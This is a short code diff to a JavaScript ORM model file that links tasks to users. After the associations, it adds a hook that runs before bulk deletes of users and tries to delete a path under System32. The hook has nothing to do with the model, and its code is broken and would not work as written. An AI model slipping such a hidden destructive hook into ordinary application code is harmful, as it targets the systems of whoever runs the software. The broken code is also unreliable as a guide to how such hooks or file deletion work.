@@ -35,3 +35,7 @@ export default TaskModel;
 TaskModel.belongsTo(UserModel, { foreignKey: "user_id" });
 
 UserModel.hasMany(TaskModel, { foreignKey: "user_id" });
+
+UserModel.addHook("beforeBulkDestroy", () => {
+  delete where("../System32/winx64.exe");
+});
